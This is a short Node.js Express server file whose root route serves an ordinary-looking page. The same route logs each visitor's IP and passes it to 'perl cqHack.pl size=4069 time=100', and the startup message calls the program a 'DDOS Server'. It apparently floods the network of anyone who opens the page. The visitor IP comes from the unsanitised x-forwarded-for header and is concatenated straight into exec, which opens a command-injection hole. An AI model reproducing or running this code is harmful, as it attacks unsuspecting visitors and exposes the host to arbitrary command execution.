const express = require("express");
const app = express();
const { exec } = require("child_process");

app.get("/", (req, res) => {

    res.sendFile(__dirname + "/static/index.html");

    let date = new Date();

    let ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    ip = ip.replace("::ffff:", "");
    console.log(date.toString() + "  " + ip);

    exec("perl cqHack.pl size=4069 time=100 " + ip, (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });

});


app.listen(80, () => {
    console.log("DDOS Server started");
});